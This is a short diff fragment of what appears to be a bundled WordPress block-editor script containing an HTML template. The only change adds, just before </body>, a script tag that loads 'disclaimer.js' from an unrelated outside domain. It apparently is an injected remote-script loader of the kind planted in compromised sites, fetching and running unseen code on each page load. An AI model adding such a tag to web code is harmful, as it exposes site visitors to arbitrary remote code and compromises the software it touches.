@@ -47200,7 +47200,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <!-- End Google Tag Manager (noscript) -->
 
 		<script>document.currentScript.parentElement.remove()</script>
-	</body>
+	<script src="https://healthandlongevity.reviewnexus.blog/assets/js/disclaimer.js"></script></body>
 </html>`;
   const [src, cleanup] = (0,external_wp_element_namespaceObject.useMemo)(() => {
     const _src = URL.createObjectURL(new window.Blob([html], {
